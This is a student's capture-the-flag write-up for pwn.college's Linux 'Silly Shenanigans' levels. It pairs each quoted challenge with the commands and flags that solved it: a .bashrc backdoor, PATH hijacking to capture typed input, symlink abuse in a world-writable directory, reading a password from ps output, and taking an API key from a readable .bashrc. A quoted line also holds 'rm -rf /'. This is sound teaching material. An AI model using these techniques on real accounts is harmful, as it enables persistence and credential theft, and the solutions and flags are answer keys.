# Silly Shenanigans

## Bashrc backdoor
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

### Solve
**Flag:** `pwn.college{ohRZeGRzp0I7t-4YdjySZB3sG8G.0VMzEzNxwCN2gjNzEzW}`

I added the command to read the flag in the .bashrc script and executed it.
```
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag' > /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{ohRZeGRzp0I7t-4YdjySZB3sG8G.0VMzEzNxwCN2gjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

### New Learnings
I learnt about .bashrc being a startup script and how you can use it.

### References

## Sniffing input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

### Solve
**Flag:** `pwn.college{MUm7XEjegUOaqY9st_Mmpp1XaKz.0VNzEzNxwCN2gjNzEzW}`

I was stuck because I entered the wrong path to the PATH variable. After I changed it to hacker's home directory which was where I created the fake flag_checker file, it worked.
```
hacker@shenanigans~sniffing-input:~$ touch flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'read -p "Type the flag" flag' > flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'echo $flag' >> flag_checker
hacker@shenanigans~sniffing-input:~$ chmod a+x flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker' > /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag*************************************************************pwn.college{MUm7XEjegUOaqY9st_Mmpp1XaKz.0VNzEzNxwCN2gjNzEzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```

### New Learnings
I practiced hijacking files and .bashrc to redirect the PATH.

### References

## Overshared directories
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:
```
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!
```
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:
```
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{gRkNVY67Thbdr2QqODMD4fobK7_.0FM0EzNxwCN2gjNzEzW}`

I removed and readded the file .bashrc from the directory so that I have write permissions on it and repeated the earlier process.
```
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ touch /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ touch flag_checker
hacker@shenanigans~overshared-directories:~$ echo 'read -p "Type the flag" flag' > flag_checker
hacker@shenanigans~overshared-directories:~$ echo 'echo $flag' >> flag_checker
hacker@shenanigans~overshared-directories:~$ chmod a+x flag_checker
hacker@shenanigans~overshared-directories:~$ echo 'PATH=/home/hacker' > /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag*************************************************************pwn.college{gRkNVY67Thbdr2QqODMD4fobK7_.0FM0EzNxwCN2gjNzEzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
```

### New Learnings
I learnt that you can use permissions from the directory to manipulate files in that directory.

### References

## Tricky linking
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!
```
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:
```
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).

### Solve
**Flag:** `pwn.college{gKqcYB0KAmYxCE-C4-TFvmQo_yd.0VM0EzNxwCN2gjNzEzW}`

I removed the evil-commands file to add it again when making the link to .bashrc. I then called /challenge/victim so that zardus would write 'cat /flag' to evil-commands which is ultimately a link to .bashrc and would get saved in that.
```
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{gKqcYB0KAmYxCE-C4-TFvmQo_yd.0VM0EzNxwCN2gjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

### New Learnings
I learnt how to use linking to write in other files.

### References

## Sniffing process arguments
Poor Zardus; you've hacked him pretty heavily. But he's wisened up and secured his home directory! Game over?

Not quite! One of the things that people often don't think about when there are multiple accounts on one computer is what kind of data their command invocations leak. Remember, when you do ps aux, you get:
```
hacker@dojo:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hacker         1  0.0  0.0   1128     4 ?        Ss   05:34   0:00 /sbin/docker-init -- /bin/sleep 6h
hacker         7  0.0  0.0   2736   580 ?        S    05:34   0:00 /bin/sleep 6h
hacker       102  0.4  0.0 723944 64660 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       138  3.3  0.0 968792 106272 ?       Sl   05:34   0:07 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       287  0.0  0.0 717648 53136 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       318  3.3  0.0 977472 98256 ?        Sl   05:34   0:06 /usr/lib/code-server/lib/node --dns-result-order=
hacker       554  0.4  0.0 650560 55360 ?        Rl   05:35   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       571  0.0  0.0   4600  4032 pts/0    Ss   05:35   0:00 /usr/bin/bash --init-file /usr/lib/code-server/li
hacker      1172  0.0  0.0   5892  2924 pts/0    R+   05:38   0:00 ps aux
hacker@dojo:~$
```
But what would happen if one of the arguments of one of those commands was something sensitive, like the flag or a password? This happens, and nefarious users sharing the same machine (or somehow otherwise listing processes on it) can steal that data and use it!

That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!

### Solve
**Flag:** `pwn.college{4mNSSB2lZzkSuQriiRTA6CR7vlB.0FOzEzNxwCN2gjNzEzW}`

I used ps aux to list all the commands running and got zardus' password. I logged in as zardus and got the flag using sudo cat /flag.
```
hacker@shenanigans~sniffing-process-arguments:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   1056   640 ?        Ss   17:06   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo-init /run/dojo/bin/sleep 6h
root           7  0.0  0.0 231708  2560 ?        S    17:06   0:00 /run/dojo/bin/sleep 6h
root         147  0.0  0.0   5204  3200 ?        S    17:06   0:00 su -c auto.sh --user zardus --pass pw_252688960 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   17:06   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_252688960
zardus       152  0.0  0.0 231708  2560 ?        S    17:06   0:00 sleep 6h
hacker       156  0.0  0.0 231576  3520 pts/0    Ss   17:06   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p37/bin/bash /run/dojo/bin/ssh-entryp
hacker       162  0.0  0.0 231940  4160 pts/0    S    17:06   0:00 /run/dojo/bin/bash --login
hacker       172  0.0  0.0 233600  3840 pts/0    R+   17:14   0:00 ps aux
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{4mNSSB2lZzkSuQriiRTA6CR7vlB.0FOzEzNxwCN2gjNzEzW}
```

### New Learnings
I learnt about data leaks through arguments of command invocations and how it's useful to other users.

### References

## Snooping on configurations
Even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your .bashrc is world-readable unless you explicitly change it!
```
hacker@dojo:~$ ls -l ~/.bashrc
-rw-r--r-- 1 hacker hacker 148 Jun  7 05:56 /home/hacker/.bashrc
hacker@dojo:~$
```
You might think, "Hey, at least it's not world-writable by default"! But even world-readable, it can do damage. Since .bashrc is processed by the shell at startup, that is where people typically put initializations for any environment variables they want to customize. Most of the time, this is innocuous things like PATH, but sometimes people store API keys there for easy access. For example, in this challenge:
```
zardus@dojo:~$ echo "FLAG_GETTER_API_KEY=sk-XXXYYYZZZ" > ~/.bashrc
```
Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:
```
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?

### Solve
**Flag:** `pwn.college{cNRjLG8foTQyXa_s_9TwbeRq5wO.0lM0EzNxwCN2gjNzEzW}`

I used the grep command to print out the string containing the key. I used the key to cat out the flag.
```
hacker@shenanigans~snooping-on-configurations:~$ grep FLAG_GETTER_API_KEY /home/zardus/.bashrc
FLAG_GETTER_API_KEY=sk-157717505
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-157717505
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{cNRjLG8foTQyXa_s_9TwbeRq5wO.0lM0EzNxwCN2gjNzEzW}
```

### New Learnings
I learnt about using the default read permission in .bashrc to get information.

### References
